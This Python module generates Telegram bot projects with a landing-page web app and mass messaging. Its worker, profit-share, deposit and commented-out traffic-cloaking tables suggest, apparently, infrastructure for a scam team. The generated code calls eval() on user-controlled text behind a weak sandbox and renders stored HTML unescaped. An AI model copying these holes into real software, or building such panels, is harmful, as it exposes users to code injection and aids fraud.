import os

from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

import config
from aiocryptopay import AioCryptoPay

from database.models import Made_Bots


async def check_crypto_bot_invoice(invoice_id: int):
    cryptopay = AioCryptoPay(config.CRYPTO_BOT_TOKEN)
    invoice = await cryptopay.get_invoices(invoice_ids=invoice_id)
    await cryptopay.close()
    if invoice and invoice.status == 'paid':
        return True
    else:
        return False


async def create_project_structure(project_name: str, id_bot: int, session: AsyncSession):
    async with session:
        made_bot_query = await session.execute(select(Made_Bots).where(Made_Bots.id == id_bot))
        made_bot = made_bot_query.scalars().first()

    root_dir = os.path.join("created_bots", project_name)

    # Correct way to create all directories recursively:
    os.makedirs(root_dir, exist_ok=True)  # Create the root directory
    for subdir in ["bot_database", "bot_handlers", "bot_middlewares", "WebApp"]:
        os.makedirs(os.path.join(root_dir, subdir), exist_ok=True)  # Create subdirectories

    files = {
        "bot_database": ["bot_models.py", "crud.py", "db.py"],
        "bot_handlers": ["handlers.py"],
        "bot_middlewares": ["user_middleware.py"],
        "WebApp": ["index.html"],
        ".": ["api.py", "bot.log", f'bot_database_{id_bot}.db', "bot_config.py", "main.py", "mailing.py", "__init__.py"],
    }

    for file_dir, file_list in files.items():
        for file_name in file_list:
            file_path = os.path.join(root_dir, file_dir, file_name) if file_dir != "." else os.path.join(root_dir,
                                                                                                         file_name)
            with open(file_path, "w") as f:
                # Заполняем файлы данными (примеры)
                if file_name == "bot_models.py":
                    f.write(f"""

from datetime import datetime
from typing import Optional
from sqlalchemy import Column, Integer, String, Boolean, DateTime, Numeric, ForeignKey, Text, JSON, BIGINT
from sqlalchemy.orm import relationship, Mapped, mapped_column
from created_bots.{project_name}.bot_database.db import Base


class User(Base):
    __tablename__ = "users"

    id = Column(Integer, primary_key=True, index=True)
    tg_id = Column(BIGINT, index=True, unique=True, nullable=False)
    lolz_profile = Column(String(255), nullable=True)  # Указываем длину 255
    nickname_display = Column(String(255), nullable=True)  # Указываем длину 255
    first_name = Column(String(255), nullable=True)
    last_name = Column(String(255), nullable=True)
    username = Column(String(255), nullable=True)
    status = Column(String(255), default="Воркер")  # Указываем длину 255
    percentage = Column(Numeric(5, 2), default=70)
    domains_limit = Column(Integer, default=2)
    bots_limit = Column(Integer, default=3)
    balance = Column(Numeric(10, 2), default=0)
    profits = Column(Numeric(10, 2), default=0)
    registration_date = Column(DateTime, default=datetime.now())
    notifications_enabled = Column(Boolean, default=True)
    ton_wallet = Column(String(255), nullable=True)  # Указываем длину 255

    referer_id: Mapped[Optional['User']] = mapped_column(ForeignKey('users.id'))
    referals: Mapped[list['User']] = relationship('User', back_populates='referer')
    referer: Mapped[Optional['User']] = relationship('User', back_populates='referals',
                                                     remote_side=[id])

    made_bots = relationship("Made_Bots", back_populates="user")
    
#     domains = relationship("Domains", back_populates="user")  # Relationship for Domains
#     subdomains = relationship("SubDomains", back_populates="user")  # Relationship for SubDomains
# 
# 
# class Domains(Base):
#     __tablename__ = "domains"
#     id = Column(Integer, primary_key=True, index=True)
#     domain = Column(String(255))
#     user_tg_id = Column(Integer, ForeignKey("users.tg_id"))  # Foreign key for user_tg_id
#     end_date = Column(DateTime)
#     type = Column(String(255), default="private")  # Указываем длину 255 (public или private)
#     status = Column(String(255), default="Не привязан")
#     landing_id = Column(Integer, ForeignKey("landings.id"))
#     registration_date = Column(DateTime, default=datetime.now())  # Указываем длину 255
#     visits = Column(Integer, default=0)
#     deposits_count = Column(Integer, default=0)
#     deposit_amount = Column(Numeric(10, 2), default=0)
#     manifest_id = Column(Integer, ForeignKey("manifest.id"))
#     cloaking_id = Column(Integer, ForeignKey("cloaking.id"))
# 
#     made_bots = relationship("Made_Bots", back_populates="domain")
#     manifest = relationship("Manifest", back_populates="domain")  # Relationship for Manifest
#     landing = relationship("Landing", back_populates="domains")
#     user = relationship("User", back_populates="domains")  # Relationship for User
#     subdomains = relationship("SubDomains", back_populates="domain")  # Relationship for Subdomains
#     cloaking = relationship("Cloaking", back_populates="domain")  # Relationship for Cloaking
# 
# 
# class SubDomains(Base):
#     __tablename__ = "subdomains"
#     id = Column(Integer, primary_key=True, index=True)
#     subdomain = Column(String(255))
#     domain_id = Column(Integer, ForeignKey("domains.id"))  # Foreign key for domain_id
#     user_tg_id = Column(BIGINT, ForeignKey("users.tg_id"))  # Foreign key for user_tg_id
#     end_date = Column(DateTime)
# 
#     user = relationship("User", back_populates="subdomains")  # Relationship for User
#     domain = relationship("Domains", back_populates="subdomains")  # Relationship for Domain
# 
# 
# class Landing(Base):
#     __tablename__ = "landings"
#     id = Column(Integer, primary_key=True, index=True)
#     name = Column(String(255))
#     landing_html = Column(Text)
#     preview = Column(String(255))
# 
#     domains = relationship("Domains", back_populates="landing") # Relationship for Domains
# 
# 
# class Manifest(Base):
#     __tablename__ = "manifest"
#     id = Column(Integer, primary_key=True, index=True)
#     title = Column(String(255), nullable=True)
#     picture = Column(Text, nullable=True)
#     link = Column(Text, nullable=True)
# 
#     domain = relationship("Domains", back_populates="manifest")  # Relationship for Domain
# 
# 
# class Cloaking(Base):
#     __tablename__ = "cloaking"
#     id = Column(Integer, primary_key=True, index=True)
#     countries = Column(Text, nullable=True)
#     ips = Column(Text, nullable=True)
#     isp_providers = Column(Text, nullable=True)
# 
#     domain = relationship("Domains", back_populates="cloaking")  # Relationship for Domain'


class Made_Bots(Base):
    __tablename__ = "made_bots"
    id = Column(Integer, primary_key=True, index=True)
    bot_id = Column(String(255), nullable=False)
    bot_name = Column(Text, nullable=True)
    bot_token = Column(Text, nullable=False)
    start_photo = Column(Text, nullable=True)
    web_app_button = Column(Text, default="Web")
    web_app_position = Column(Boolean, default=False)
    start_message = Column(Text, nullable=True, default='👋')
    buttons = Column(JSON, nullable=True)
    is_working = Column(Boolean, default=False)
    is_referal = Column(Boolean, default=True)
    process = Column(Text, nullable=True)
    web_app_link = Column(Text, nullable=True)
    web_app_html = Column(Text, nullable=True)
    user_tg_id = Column(BIGINT, ForeignKey("users.tg_id"))

    user = relationship("User", back_populates="made_bots")
    mailing = relationship("Mailing", back_populates="made_bots")  # Relationship for User


class Mailing(Base):
    __tablename__ = "mailing"
    id = Column(Integer, primary_key=True, index=True)
    name = Column(String(255), nullable=True)
    mailing_text = Column(Text, nullable=True)
    mailing_buttons = Column(Text, nullable=True)
    interval = Column(Integer, nullable=True)
    bot_id = Column(Integer, ForeignKey("made_bots.id"))
    is_mailing = Column(Boolean, default=False) 

    made_bots = relationship("Made_Bots", back_populates="mailing")

           
                    """)
                elif file_name == "db.py":
                    f.write(f"""

from sqlalchemy import create_engine
from sqlalchemy.ext.asyncio import (create_async_engine, async_sessionmaker,
                                    AsyncSession)
from sqlalchemy.orm import sessionmaker
from sqlalchemy.ext.declarative import declarative_base
from created_bots.{project_name}.bot_config import settings

""" + """
bot_id = settings.BOT_ID
bot_name = settings.BOT_NAME

# URL вашей базы данных (замените на актуальный)
SQLALCHEMY_DATABASE_URL = f'sqlite+aiosqlite:///bot_database_{bot_name}.db'

# Создаем движок SQLAlchemy
async_engine = create_async_engine(SQLALCHEMY_DATABASE_URL)

# Создаем сессию
async_session = async_sessionmaker(async_engine, expire_on_commit=False)

# Базовый класс для декларативных моделей
Base = declarative_base()


# Функция для получения сессии
async def get_db() -> AsyncSession:
    async with async_session() as session:
        yield session


async def get_session() -> AsyncSession:  # type: ignore
    async with async_session() as session:
        yield session


async def init_models():
    async with async_engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)


async def dispose_engine():
    await async_engine.dispose()

""")
                elif file_name == "crud.py":
                    f.write(f"""
from typing import List, Sequence
from sqlalchemy import select, update, func
from sqlalchemy.orm import selectinload
from sqlalchemy.ext.asyncio import AsyncSession
from created_bots.{project_name}.bot_database.bot_models import User
from aiogram import Bot""" + """



async def get_user_by_tg_id(session: AsyncSession, tg_id: int) -> User | None:
    result = await session.execute(select(User).where(User.tg_id == tg_id))
    return result.scalars().first()


async def register_referal(session: AsyncSession, referer: User, user: User, bot: Bot):
    (await referer.awaitable_attrs.referals).append(user)
    if referer.is_worker:
        await bot.send_message(
            referer.tg_id,
            f'Ваш реферал {user.tg_id} привязан к вашей учетной записи. ',
        )

""")
                elif file_name == "handlers.py":
                    f.write(f"""
import json
import os
import random
import re
from aiogram import Router
from aiogram.filters import CommandStart
from aiogram.types import CallbackQuery, Message, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo, FSInputFile
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select
from created_bots.{project_name}.bot_database.bot_models import Made_Bots, User
from created_bots.{project_name}.bot_middlewares.user_middleware import AuthorizeMiddleware
from created_bots.{project_name}.bot_config import settings

""" + """
router = Router()  # Создаем роутер для обработчиков
router.message.middleware(AuthorizeMiddleware())
router.callback_query.middleware(AuthorizeMiddleware())
bot_id = settings.BOT_ID
bot_name = settings.BOT_NAME


async def generate_interactive_elements(session: AsyncSession, user: User):
    made_bot_query = await session.execute(select(Made_Bots).where(Made_Bots.bot_id == bot_name))
    made_bot = made_bot_query.scalars().first()

    if not made_bot or not made_bot.buttons:
        return None, None, None

    try:
        data = json.loads(made_bot.buttons)
        if isinstance(data, str):
            data = json.loads(data)
    except json.JSONDecodeError:
        return None, None, None

    keyboard = []
    messages = {}
    photos = {}
    button_index = 1

    user_info = {
        "first_name": user.first_name if user.first_name is not None else "",
        "last_name": user.last_name if user.last_name is not None else "",
        "username": user.username if user.username is not None else "",
        "@username": f"@{user.username}" if user.username else "",
        "telegram_id": user.tg_id if user.tg_id is not None else "",
    }

    for item in data:
        button_type = item.get('type')
        button_text = item.get('text', '').format(**user_info)
        response_text = item.get('answer', '')
        processed_response = await process_functions(response_text)
        processed_response = processed_response.format(**user_info)
        photo = item.get('photo')

        callback_data = f"callback_{button_index}"

        if button_type == '💬' or button_type == '✏️' or button_type == '🔔':
            keyboard.append([InlineKeyboardButton(text=button_text, callback_data=callback_data)])
            messages[callback_data] = processed_response
            if photo:
                photos[callback_data] = photo
        elif button_type == '🔗' and 'url' in item:
            keyboard.append([InlineKeyboardButton(text=button_text, url=item['url'])])
        elif button_type == '🌐' and made_bot.web_app_link:
            keyboard.append([InlineKeyboardButton(text=button_text, web_app=WebAppInfo(url=made_bot.web_app_link))])

        button_index += 1

    markup = InlineKeyboardMarkup(inline_keyboard=keyboard)
    return markup, messages, photos


async def process_functions(message_text: str) -> str:
    # Обработка {random(x,y)}
    message_text = re.sub(r"{random\((\d+),(\d+)\)}",
                          lambda match: str(random.randint(int(match.group(1)), int(match.group(2)))), message_text)

    # Обработка {n: выражение} и {^n}
    variables = {}
    message_text = re.sub(r"{(\d+):(.*?)}", lambda match: variables.update(
        {int(match.group(1)): eval(match.group(2), {'__builtins__': None}, variables)}), message_text)

    message_text = re.sub(r"{\d+:.*?}", "", message_text)  # Удаляем определения переменных из текста
    message_text = re.sub(r"{\^(\d+)}", lambda match: str(variables.get(int(match.group(1)), "")), message_text)

    return message_text


@router.message(CommandStart())
async def start(message: Message, session: AsyncSession, user: User):
    made_bot_query = await session.execute(select(Made_Bots).where(Made_Bots.bot_id == bot_name))
    made_bot = made_bot_query.scalars().first()
    markup, messages, photos = await generate_interactive_elements(session, user)
    text = made_bot.start_message if made_bot and made_bot.start_message else "Привет!"
    new_text = await process_functions(text)
    user_info = {
        "first_name": user.first_name if user.first_name is not None else "",
        "last_name": user.last_name if user.last_name is not None else "",
        "username": user.username if user.username is not None else "",
        "@username": f"@{user.username}" if user.username else "",
        "telegram_id": user.tg_id if user.tg_id is not None else "",
    }
    user_text = new_text.format(**user_info)
    photo_path = made_bot.start_photo if made_bot and made_bot.start_photo else None

    if photo_path and os.path.exists(photo_path):
        await message.answer_photo(FSInputFile(photo_path), caption=user_text, reply_markup=markup, parse_mode='HTML')
    else:
        await message.answer(user_text, reply_markup=markup, parse_mode='HTML')


@router.callback_query()
async def callback_handler(call: CallbackQuery, session: AsyncSession, user: User):
    markup, messages, photos = await generate_interactive_elements(session, user)

    if markup and messages and call.data in messages:
        message_text = messages[call.data]
        photo_path = photos.get(call.data)

        if photo_path and os.path.exists(photo_path):
            await call.message.answer_photo(FSInputFile(photo_path), caption=message_text, reply_markup=markup,
                                            parse_mode='HTML')
        else:
            await call.message.answer(message_text, reply_markup=markup, parse_mode='HTML')

    await call.answer()



""")
                elif file_name == "user_middleware.py":
                    f.write(f"""

from aiogram import BaseMiddleware
from aiogram.types import Message
import logging
from created_bots.{project_name}.bot_database.crud import get_user_by_tg_id, register_referal
from created_bots.{project_name}.bot_database.bot_models import User
from created_bots.{project_name}.bot_database.db import async_session
from sqlalchemy import select, update 
 """ + """
class AuthorizeMiddleware(BaseMiddleware):
    '''Inject AsyncSession and User objects'''

    async def __call__(self, handler, event: Message, data) -> bool:
        async with async_session() as session:
            uid = event.from_user.id if hasattr(event, 'from_user') else event.message.from_user.id
            query = select(User).where(User.tg_id == uid)
            user: User = (await session.execute(query)).scalar()
            if not user:
                user = User(tg_id=event.from_user.id,
                            first_name=event.from_user.first_name,
                            last_name=event.from_user.last_name,
                            username=event.from_user.username
                            )
                logger = logging.getLogger()
                logger.info(f'New user')
                session.add(user)

                if 'command' in data and (command := data['command']).args:
                    referer_tg_id = command.args
                    referer = await get_user_by_tg_id(session, referer_tg_id)

                    if referer and not referer.is_worker:  # Check if referer is not None
                        await referer.send_log(data['bot'],
                                               f"Добавление реферала ID реферала:<code>{user.tg_id}</code>")

                    await session.refresh(user, ['referer'])

                    if referer and referer is not user and user.referer is None:
                        user.currency = referer.currency_for_referals
                        session.add(user)
                        await session.commit()
                        await register_referal(session, referer, user,
                                                bot=data['bot'])
            await session.commit()
            data['user'] = user
            data['session'] = session
            result = await handler(event, data)
            await session.commit()
        return result

""")
                elif file_name == "index.html":
                    f.write("""{{ landing_html | safe }} """)
                elif file_name == "api.py":
                    f.write(f"""
import asyncio
from typing import Optional
from aiogram import Bot
from aiogram.types import BotCommand, BotCommandScopeDefault, MenuButtonWebApp, WebAppInfo, MenuButtonDefault, \
    BotCommandScopeChat
from fastapi import APIRouter, Query, Request, Depends, HTTPException
from aiogram.methods import SetChatMenuButton
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select
from created_bots.{project_name}.bot_database import db
from created_bots.{project_name}.bot_database.db import get_session
from created_bots.{project_name}.bot_database.bot_models import Made_Bots, Mailing, User
from created_bots.{project_name}.bot_config import settings
from created_bots.{project_name} import mailing as mailing_py
""" + """
bot_name = settings.BOT_NAME

task_storage = {}

router = APIRouter()  # This line is CRUCIAL: creates the router INSTANCE

templates = Jinja2Templates(directory="created_bots/bot_ddyfl/WebApp")


@router.get("/", response_class=HTMLResponse)
async def get_main_page(request: Request, bot_name: str = Query(...), session: AsyncSession = Depends(get_session)):
    try:
        async with session:
            made_bot_query = await session.execute(select(Made_Bots).where(Made_Bots.bot_name == bot_name))
            made_bot = made_bot_query.scalars().first()

            if made_bot:
                landing_html = made_bot.web_app_html
            else:
                landing_html = None

        context = {
            "landing_html": landing_html
        }

        return templates.TemplateResponse(request=request, name="index.html", context=context)

    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Database error: {e}")


async def start_mailing(db: AsyncSession, bot_id: str, mailing_text: str, mailing_buttons: Optional[str] = None,
                        mailing_interval: Optional[str] = None, is_mailing: Optional[bool] = True):
    try:
        async with db.begin():
            bot_query = await db.execute(select(Made_Bots).where(Made_Bots.bot_id == bot_id))
            bot = bot_query.scalars().first()
            if not bot:
                raise HTTPException(status_code=404, detail="Бот не найден")

        mailing = Mailing(mailing_text=mailing_text, mailing_buttons=mailing_buttons, made_bots=bot,
                          interval=mailing_interval, is_mailing=is_mailing)
        db.add(mailing)
        await db.commit()
        await db.refresh(mailing)  # Получаем ID рассылки

        mailing_id = mailing.id
        user_ids = [user.tg_id for user in (await db.execute(select(User))).scalars().all()]
        bot_instance = Bot(token=settings.BOT_TOKEN)

        # Добавьте вывод на консоль для отладки
        print(f"Запуск рассылки с mailing_id={mailing_id}, user_ids={user_ids}")

        # Запускаем рассылку в фоне, не блокируя выполнение
        task = asyncio.create_task(mailing_py.start_mailing_loop(bot_instance, mailing, user_ids))

        task_storage[mailing_id] = task

        # Немедленно возвращаем mailing_id и задачу
        return {"mailing_id": mailing_id}
    except Exception as e:
        print(f"Ошибка запуска рассылки: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Ошибка запуска рассылки: {str(e)}")


@router.post(f"/start_mailing_{bot_name}")
async def start_mailing_endpoint(
        bot_id: str,
        mailing_text: str,
        mailing_buttons: Optional[str] = None,
        mailing_interval: Optional[str] = None,
        is_mailing: Optional[bool] = True,
        db: AsyncSession = Depends(get_session),
):
    return await start_mailing(db, bot_id, mailing_text, mailing_buttons, mailing_interval, is_mailing)


@router.post(f"/stop_mailing_{bot_name}")
async def stop_mailing(mailing_id: int, db: AsyncSession = Depends(get_session)):
    try:
        # Логируем начало обработки запроса
        print(f"Останавливаем рассылку с ID: {mailing_id}")

        # Получаем задачу из хранилища и отменяем её до начала работы с транзакцией
        task = task_storage.get(mailing_id)
        if task:
            print(f"Задача для рассылки {mailing_id} найдена.")
            if not task.done():
                task.cancel()
                try:
                    await task  # Ждем завершения задачи
                    print(f"Задача для рассылки {mailing_id} была отменена.")
                except asyncio.CancelledError:
                    print(f"Задача для рассылки {mailing_id} была отменена и исключение обработано.")
            else:
                print(f"Задача для рассылки {mailing_id} уже завершена.")

            # Удаляем задачу из хранилища после отмены
            del task_storage[mailing_id]
            print(f"Задача для рассылки {mailing_id} удалена из хранилища.")
        else:
            print(f"Задача для рассылки {mailing_id} не найдена в хранилище.")

        # Далее работаем с транзакцией
        async with db.begin():  # Используем контекст сессии и транзакции
            print(f"Открыта транзакция для рассылки {mailing_id}")
            mailing = await db.get(Mailing, mailing_id)
            if mailing:
                print(f"Найдено рассылка с ID: {mailing_id}. Обновляем статус.")
                mailing.is_mailing = False
                db.add(mailing)
                await db.flush()  # Обеспечиваем, что изменения применятся в базе
                await db.refresh(mailing)
                print(f"Статус рассылки {mailing_id} обновлен.")
                return {"message": "Рассылка остановлена"}
            else:
                print(f"Рассылка с ID {mailing_id} не найдена в базе.")
                raise HTTPException(status_code=404, detail="Рассылка не найдена")
    except Exception as e:
        print(f"Ошибка остановки рассылки: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Ошибка остановки рассылки: {str(e)}")

async def set_webapp_button(bot: Bot, url: str, text: str, add_webapp: bool, chat_id: int):
    try:
        if add_webapp:
            commands = [
                BotCommand(command="webapp", description=text),
                BotCommand(command="start", description="Запуск бота")
            ]
            button = MenuButtonWebApp(text=text, web_app=WebAppInfo(url=url))
            await bot.set_my_commands(commands, scope=BotCommandScopeDefault())
            await bot.set_chat_menu_button(chat_id=chat_id, menu_button=button)

            print("WebApp button set")
        else:
            await bot.set_chat_menu_button(chat_id=chat_id, menu_button=MenuButtonDefault())
            await bot.delete_my_commands(scope=BotCommandScopeDefault())
            print("Default button set")
    except Exception as e:
        print(f"Error setting WebApp button: {e}")

async def get_bot() -> Bot:
    return Bot(settings.BOT_TOKEN)


@router.post(f"/webapp_on_{bot_name}")
async def web_app_on(web_app_url: str, web_app_text: str, chat_id: int, bot: Bot = Depends(get_bot)):
    await set_webapp_button(bot, web_app_url, web_app_text, add_webapp=True, chat_id=chat_id)


@router.post(f"/webapp_off_{bot_name}")
async def web_app_off(web_app_url: str, web_app_text: str, chat_id: int, bot: Bot = Depends(get_bot)):
    await set_webapp_button(bot, web_app_url, web_app_text, add_webapp=False, chat_id=chat_id)


""")
                elif file_name == "main.py":
                    f.write(f"""
import asyncio
import logging
from contextlib import asynccontextmanager
import uvicorn
import sys
import os
import aiogram
from aiogram import Bot, Dispatcher
from fastapi import FastAPI, Request
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../../")))
from created_bots.{project_name}.bot_handlers import handlers
from created_bots.{project_name}.bot_database.db import init_models, dispose_engine
from created_bots.{project_name}.api import router as api_router
from created_bots.{project_name}.bot_config import settings
""" + """

BOT_TOKEN = settings.BOT_TOKEN
BOT_ID = settings.BOT_ID  # Замените на токен вашего бота
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
logging.basicConfig(filename="bot.log", level=logging.INFO)
sys.path.append(os.path.abspath(os.path.dirname(__file__)))

async def on_startup():
    logging.info("Starting bot setup...")
    await init_models()
    bot_info = await bot.get_me()
    logging.getLogger(__name__).info(f'Бот успешно запущен: {bot_info.username}')
    
async def on_shutdown():
    await bot.close()
    await dispose_engine()
    
    
async def main():
    dp.include_router(handlers.router)
    await on_startup()
    try:
        await dp.start_polling(bot, skip_updates=True)
    finally:
        await on_shutdown()


if __name__ == "__main__":
    asyncio.run(main())


""")
                elif file_name == 'bot_config.py':
                    f.write(f"""
import config            
             
                    
class Settings():
    BOT_ID = '{id_bot}'
    BOT_NAME = '{project_name}'
    BOT_TOKEN = '{made_bot.bot_token}'
    WEB_APP_LINK = '{made_bot.web_app_link}'
    TELEGRAM_WEBHOOK_PATH = '/telegram_webhook/'
    WEBHOOK_PORT = 8080



settings = Settings()
""")
                elif file_name == "mailing.py":
                    f.write(f"""
import asyncio
import random
import re
from aiogram import Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from sqlalchemy.future import select
from sqlalchemy.ext.asyncio import AsyncSession
from datetime import datetime, timedelta
from created_bots.{project_name}.bot_database.bot_models import Made_Bots, Mailing, User
from created_bots.{project_name}.bot_database.db import get_session
from created_bots.{project_name}.bot_config import settings
""" + """

async def start_mailing_loop(bot: Bot, mailing: Mailing, user_ids: list):
    try:
        print("открываю сессию")
        async for session in get_session():  # Получаем сессию через async for
            print("сессия открыта")

            # Отправляем рассылку один раз
            await send_mailing(bot, mailing, user_ids, session)
            print("Сообщение отправлено")

            # Если интервал не указан (None или ''), отправляем сообщение один раз и выходим
            if not mailing.interval or not str(mailing.interval).isdigit():
                print("Интервал не указан, завершаем рассылку")
                break

            # Если интервал указан, выполняем рассылку с задержкой
            interval_seconds = int(mailing.interval) * 60
            while mailing.is_mailing and interval_seconds > 0:
                await asyncio.sleep(interval_seconds) 
                await send_mailing(bot, mailing, user_ids, session)
                print(f"Повторная отправка через {interval_seconds} секунд")

            break  # Выходим после завершения цикла
    except Exception as e:
        print(f"Ошибка запуска рассылки: {str(e)}")


async def send_mailing(bot: Bot, mailing: Mailing, user_ids: list, session: AsyncSession):
    # Обрабатываем текст
    mailing_text = await process_functions(mailing.mailing_text)
    # Генерируем кнопки
    keyboard = await generate_buttons(mailing.mailing_buttons, session)

    for user_id in user_ids:
        try:
            user_query = await session.execute(select(User).where(User.tg_id == user_id))
            user = user_query.scalars().first()
            if not user:
                continue  # Пропускаем пользователя, если его нет в БД

            user_info = {
                "first_name": user.first_name if user.first_name is not None else "",
                "last_name": user.last_name if user.last_name is not None else "",
                "username": user.username if user.username is not None else "",
                "@username": f"@{user.username}" if user.username else "",
                "telegram_id": user.tg_id if user.tg_id is not None else "",
            }

            # Форматируем текст с данными пользователя
            user_text = mailing_text.format(**user_info)

            await bot.send_message(chat_id=user.tg_id, text=user_text, reply_markup=keyboard, parse_mode='HTML')

        except Exception as e:
            print(f"Ошибка отправки сообщения {user_id}: {e}")


async def generate_buttons(buttons_str: str, session) -> InlineKeyboardMarkup:
    if not buttons_str or buttons_str.lower() == "none":
        return None  # Если кнопок нет, отправляем просто текст
    bot_name = settings.BOT_NAME
    made_bot_query = await session.execute(select(Made_Bots).where(Made_Bots.bot_id == bot_name))
    made_bot = made_bot_query.scalars().first()
    buttons = []
    for button_data in buttons_str.split(","):
        parts = button_data.strip().split(" + ")
        if len(parts) == 2:
            text, link = parts
            if link == 'webapp':
                web_app_link = settings.WEB_APP_LINK
                button = InlineKeyboardButton(text=text, web_app=WebAppInfo(url=web_app_link))
            else:
                button = InlineKeyboardButton(text=text, url=link)
            buttons.append([button])

    return InlineKeyboardMarkup(inline_keyboard=buttons) if buttons else None


async def process_functions(message_text: str) -> str:
    # Обработка {random(x,y)}
    message_text = re.sub(r"{random\((\d+),(\d+)\)}",
                          lambda match: str(random.randint(int(match.group(1)), int(match.group(2)))), message_text)

    # Обработка {n: выражение} и {^n}
    variables = {}
    message_text = re.sub(r"{(\d+):(.*?)}", lambda match: variables.update(
        {int(match.group(1)): eval(match.group(2), {'__builtins__': None}, variables)}), message_text)

    message_text = re.sub(r"{\d+:.*?}", "", message_text)  # Удаляем определения переменных из текста
    message_text = re.sub(r"{\^(\d+)}", lambda match: str(variables.get(int(match.group(1)), "")), message_text)

    return message_text




""")
